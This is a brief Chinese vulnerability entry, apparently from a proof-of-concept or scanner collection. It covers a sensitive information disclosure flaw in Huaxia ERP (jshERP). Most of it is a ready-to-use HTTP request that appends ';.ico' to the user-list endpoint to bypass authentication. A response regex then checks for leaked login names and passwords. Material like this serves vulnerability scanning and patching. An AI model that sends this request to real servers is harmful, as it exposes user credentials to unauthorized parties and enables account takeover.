# 华夏ERP敏感信息泄露漏洞

华夏ERP敏感 ｜ 信息泄露 ｜ —
- **请求**：`GET /jshERP-boot/user/getAllList;.ico HTTP/1.1`
- **响应特征**：200 ^(?=.*?loginName)(?=.*?password).*?$